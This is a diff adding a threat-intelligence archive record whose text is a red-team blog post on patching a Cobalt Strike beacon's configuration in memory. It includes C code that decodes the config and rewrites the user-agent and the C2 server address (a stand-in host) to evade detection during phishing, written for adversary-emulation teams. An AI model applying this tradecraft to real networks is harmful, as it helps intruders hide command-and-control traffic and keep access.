@@ -1,0 +1,82 @@
+{
+    "id": "32ae399b-0d34-4aa7-afcb-2c6f5846d58c",
+    "created_at": "2023-01-12T15:03:00.702274Z",
+    "updated_at": "2025-03-27T02:16:25.998728Z",
+    "deleted_at": null,
+    "sha1_hash": "9d74f022ef1bc6dd5d8161f1a66740f5569bc128",
+    "title": "2021-01-28 - Tailoring Cobalt Strike on Target",
+    "authors": "",
+    "file_creation_date": "2022-05-27T22:36:27Z",
+    "file_modification_date": "2022-05-27T22:36:27Z",
+    "file_size": 1881321,
+    "plain_text": "# Tailoring Cobalt Strike on Target\n\n**trustedsec.com/blog/tailoring-cobalt-strike-on-target/**\n\nBy Adam Chester in Penetration Testing, Red Team Adversarial Attack Simulation, Research, Security Testing & Analysis\n\nJanuary 28, 2021\n\n\n-----\n\nWe ve all been there: you ve completed your initial recon, sent in your emails to gather those\nleaked HTTP headers, spent an age configuring your malleable profile to be just right, set up\nyour CDNs, and spun up your redirectors. Then it’s time, you send in your email aaaaaand…\nnothing. You can see from your DNS diagnostic callbacks that the beacon executed, so what\ngives? You quickly make a few changes to your payload and resend your phish. But it’s too\nlate, a Slack message has been sent, warning everyone to be careful of opening suspicious\nemails…\n\nOK, so maybe that’s a tad specific, but you get the point. Phishing is getting harder and\nrightly so—as an industry, we’ve spent years sending campaign after campaign, openly\npublishing research on how to evade that new security product with that obscure fronting\ntechnique. But we can’t really afford to lose what could be our only avenue for gaining\naccess to a target, right?\n\nHere on the TrustedSec Adversary Emulation team, we’ve spent a lot of time coming up with\nways to ensure that our first payload execution attempt has as much chance of succeeding\nas possible. One effective technique is offloading the configuration of our command and\ncontrol (C2) profile to the target by analysing the execution environment and checking our\npotential connectivity before we ever kick off a beacon. That way, we can be sure that\neverything will work and look as benign as possible before we let our agent work its magic.\n\nUnfortunately, this kind of technique isn’t supported out-of-the-box on frameworks like Cobalt\nStrike. In this blog post, we will look at one method that has proved to be useful to achieving\nthis level of customization by patching Cobalt Strike’s beacon payload on target.\n\n## Cobalt Strike Beacon Generation\n\nBefore we look at what we are doing to squeeze out every last bit of Cobalt Strike\ncustomization we can, we first need to understand how our options are embedded within a\ngenerated beacon.\n\nSomewhat ironically for us, this research has already been done by defenders such as\nSentinelOne’s [CobaltStrikeParser project created by](https://github.com/Sentinel-One/CobaltStrikeParser) [Gal Kristal, which looks to extract](https://twitter.com/gal_kristal?lang=en)\ninformation from a binary beacon and displays details to defenders.\n\nSo how is our configuration embedded within a beacon and how do we find it? The first thing\nwe need to do is to scan our beacon for the signature `\\x2e\\x2f\\x2e\\x2f\\x2e\\x2c, which`\nis an XOR obfuscated version of the binary blob `\\x00\\x01\\x00\\x01\\x00\\x02 (the`\nsignificance of this blob will become apparent as we move through this post).\n\nEach option added to the beacon configuration is encoded using a header and a data value.\nThe header is made up of three (3) 16-bit values with the format:\n```\n[ ID ] [ DATA TYPE ID ] [ LENGTH OF VALUE ] [ VALUE ]\n\n```\n\n-----\n\nThe `ID field signifies the configuration option that this setting applies to, e.g., if the option`\nrefers to the user-agent string, the ID field would be `9 .`\n\nNext the `DATA TYPE ID field is assigned to the data type used for the options value. At the`\ntime of writing, the data type IDs supported are:\n\n1 – Short\n2 – Int\n3 – String\n4 – Data\n\nFollowing this is a `LENGTH OF VALUE field, which specifies the allocated length in bytes of`\nthe option value, which follows the header. An important caveat here is that the length field is\nset to how much total space is actually allocated for a value. For example, if we have a data\ntype of `3 and a value of` `Hello\\x00, but the field permits 128 bytes, the length field would`\nbe set to `128 .`\n\nFinally, we have the actual value itself. If we were adding a Port option (which has an `ID of`\n2) of the type `Short and a value of` `3133, this would be represented as:`\n```\n[ 2 ] [ 1 ] [ 2 ] [ 3133 ]\n\n```\nOnce our option has been embedded, it is obfuscated with an XOR key of `0x2e, which`\nhelps to hide everything from the casual “strings” command.\n\nTo make life a bit easier for us as we work with these configuration options, we can use the C\nstruct of:\n```\nstruct CSConfigField {\n unsigned short ID;\n unsigned short dataType;\n unsigned short dataLength;\n union {\n  unsigned short shortData;\n  unsigned int intData;\n  char data[1];\n } value;\n};\n\n```\nNow that we know just how our options are embedded within our beacon, we can move on to\nlooking at configuring these options during runtime.\n\n## Huh?? We Don’t Even use IE\n\nOne thing that we can configure in Cobalt Strike using a malleable profile is the user-agent\nused by the beacon for HTTP C2 requests. To do this, we would add something like:\n```\nset useragent \"something legit\";\n\n```\n\n-----\n\nWe would typically set this to something that we gather during OSINT, but as noted in the\ndocumentation, if we fail to provide this configuration option, what we end up with is a\nrandom Internet Explorer user-agent. The way Cobalt Strike does this is to select a useragent from a finite list at random during beacon creation. Some samples are:\n```\nMozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)\n\n```\nNow if the target is using IE, this would be somewhat OK (although the OS version would still\nbe a giveaway), but what if a host known to use Chrome or Firefox suddenly starts making IE\nrequests out to a new domain…pretty suspicious.\n\nThis makes an ideal first candidate for customising our beacon payload on target, by finding\nany active browsers or the default registered browser and updating our `useragent option`\nbefore we kick off our beacon.\n\nTo do this, we first need to find our beacon configuration block, which as we now know can\nbe done by hunting for the `\\x2e\\x2f\\x2e\\x2f\\x2e\\x2c signature:`\n```\n#define MAX_MALLEABLE_SIGNATURE_LENGTH 6\n#define MALLEABLE_SIGNATURE \"\\x2e\\x2f\\x2e\\x2f\\x2e\\x2c\"\n#define MALLEABLE_LENGTH 6\n#define MALLEABLE_XOR 0x2e\n#define MALLEABLE_CONFIG_SIZE 4096\nextern char inmemorybeacon[];\nint beaconConfigOffset = 0;\nint xorKey = 0;\n// Hunt for the Cobalt Strike profile in memory\nfor (int i = 0; i < beaconLength - MAX_MALLEABLE_SIGNATURE_LENGTH; i++) {\n  if (memcmp(beacon + i, MALLEABLE_SIGNATURE, MALLEABLE_LENGTH) == 0) {\n    beaconConfigOffset = i;\n    xorKey = MALLEABLE_XOR;\n  break;\n  }\n}\n\n```\nOnce we have this, we need to decode the config blob using an XOR key of `0x2e :`\n```\nchar config[MALLEABLE_CONFIG_SIZE];\n// Decode the profile using the XOR key we have\nfor (int i = 0; i < MALLEABLE_CONFIG_SIZE; i++) {\n  config[i] = *(beacon + beaconConfigOffset + i) ^ xorKey;\n}\n\n```\nWhen decoded we can then parse the config until we find the ID of `9 corresponding to the`\nuser-agent option:\n\n\n-----\n\n```\n#define CS_OPTION_USERAGENT 9\nstruct CSConfigField *configField = (struct CSConfigField *)malleable;\nwhile(SWAP_UINT16(configField->ID) != 0x00) {\n if (SWAP_UINT16(configField->ID) == CS_OPTION_USERAGENT) {\n  // Do something with our user-agent here\n    break;\n }\n configField = (struct CSConfigField *)((char *)configField + 6 +\nSWAP_UINT16(configField->dataLength));\n}\n\n```\nIf we find this option, we will see that we have 128 bytes to play with. We first need to decide\non the user-agent most likely to make sense for our target and copy this over to our config:\n```\nuserAgent = findBestUserAgentMatch();\nmemset(configField->value.data, 0, SWAP_UINT16(configField->dataLength));\nstrncpy(configField->value.data, userAgent, SWAP_UINT16(configField->dataLength));\n\n```\nAnd once we have set this, we then update the config blob and re-XOR before passing\nexecution to the beacon:\n```\n// Re-encode the config to be copied back into memory\nfor (int i = 0; i < MALLEABLE_CONFIG_SIZE; i++) {\n  *(beacon + beaconConfigOffset + i) = config[i] ^ xorKey;\n}\n\n```\nNow if everything goes well, we will end up with our C2 beaconing using our newly\nconfigured (and hopefully more accurate) user-agent:\n\n\n-----\n\nWatch Video At:\n\nhttps://youtu.be/65Ye_uBevrA\n\n## Can we even reach our C2?\n\nNext up is something that has annoyed most of us: execution of a payload that fails because\nour C2 channel is blocked. Many people will use Cobalt Strike’s round-robin functionality to\nseed a number of potentially valid egress addresses, but this suffers from a number of\ndrawbacks. First is the fact that each needs to be provided upfront, meaning we cannot\nadjust the C2 destination using an alternate channel if we find that we cannot connect.\nSecondly, the round-robin approach doesn’t remove any blocked destinations from its pool,\nmeaning if only one (1) out of four (4) targets is valid, you will still be hitting three (3)\npotentially blocked locations each time the beacon cycles.\n\nSo how do we go about updating something like our C2 destination? Similar to the useragent option, we again need to grab our configuration block and hunt for the C2 Server\noption, which is found using the ID of `8 :`\n```\nstruct CSConfigField *configField = (struct CSConfigField *)malleable;\nwhile(SWAP_UINT16(configField->ID) != 0x00) {\n if (SWAP_UINT16(configField->ID) == CS_OPTION_C2) {\n  // Do something with our c2 target here\n    break;\n }\n configField = (struct CSConfigField *)((char *)configField + 6 +\nSWAP_UINT16(configField->dataLength));\n}\n\n```\n\n-----\n\nBefore we update our callback destination, we need to have some idea of where to point our\nC2. For the purposes of this proof of concept (POC), we are going to use a hardcoded list of\nendpoints that are checked for connectivity, but feel free to get creative with your egress\nselection process. At TrustedSec, we have crafted a few options to select an appropriate C2\ndestination. One that works particularly well is a rule-based selection based on DNS CNAME\nrecords, allowing the rotation, removal, or addition of new locations as required:\n\nOnce we have testing connectivity to make sure that everything will work, all that is left to do\nis to update our C2 location in our beacon configuration:\n```\nstrncpy(configField->data, \"derivedc2address.com,/Page\", configField->dataLength);\n\n```\nHere it is worth noting the format of the configuration option, where we have our C2 address\nof `derivedc2address.com followed by the GET page of` `/Page . The page option needs`\nto match your malleable profile (unless you use a customised redirector), but we are free to\nset the target as we wish.\n\nFinally, we re-XOR our config, release the beacon, and watch it connect to our newly\nselected destination, which we have verified upfront will work:\n\n\n-----\n\nWatch Video At:\n\nhttps://youtu.be/fE4nPA_eeZE\n\nWhat options are available for us to modify before execution? Some interesting options are:\n\n2 (Short) – Port\n3 (Int) – Sleep Time\n5 (Short) – Jitter\n8 (256 byte string) – C2 Server\n9 (128 byte string) – User Agent\n10 (64 byte string) – Post URI\n14 (16 byte data) – SpawnTo\n15 (128 byte string) – Pipe Name\n26 (16 byte string) – GET verb\n27 (16 byte string) – POST verb\n28 (Int – 96 as true, 0 as false) – Should Chunk Posts\n29 (64 byte string) – SpawnTo (x86)\n30 (64 byte string) – SpawnTo (x64)\n\nFor a full list you can either review Cobalt Strike’s `BeaconPayload.class, or refer to`\n[defensive tools which have a pretty comprehensive list already.](https://github.com/Sentinel-One/CobaltStrikeParser/blob/81726103455f4f2789b2388387093f087a7a7724/parse_beacon_config.py#L219)\n\n[A sample of the code used in this post is now available on GitHub here, enjoy (and get](https://gist.github.com/xpn/6c40d620607e97c2a09c70032d32d278)\ncreative)!\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-01-28 - Tailoring Cobalt Strike on Target.pdf"
+    ],
+    "report_names": [
+        "2021-01-28 - Tailoring Cobalt Strike on Target.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
+            "created_at": "2024-11-01T02:00:52.756877Z",
+            "updated_at": "2025-03-27T02:00:55.544216Z",
+            "deleted_at": null,
+            "main_name": "Play",
+            "aliases": null,
+            "source_name": "MITRE:Play",
+            "tools": [
+                "Nltest",
+                "AdFind",
+                "PsExec",
+                "Wevtutil",
+                "Cobalt Strike",
+                "Playcrypt",
+                "Mimikatz"
+            ],
+            "source_id": "MITRE",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535780,
+    "ts_updated_at": 1743041785,
+    "ts_creation_date": 1653690987,
+    "ts_modification_date": 1653690987,
+    "files": {
+        "pdf": "https://archive.orkl.eu/9d74f022ef1bc6dd5d8161f1a66740f5569bc128.pdf",
+        "text": "https://archive.orkl.eu/9d74f022ef1bc6dd5d8161f1a66740f5569bc128.txt",
+        "img": "https://archive.orkl.eu/9d74f022ef1bc6dd5d8161f1a66740f5569bc128.jpg"
+    }
+}
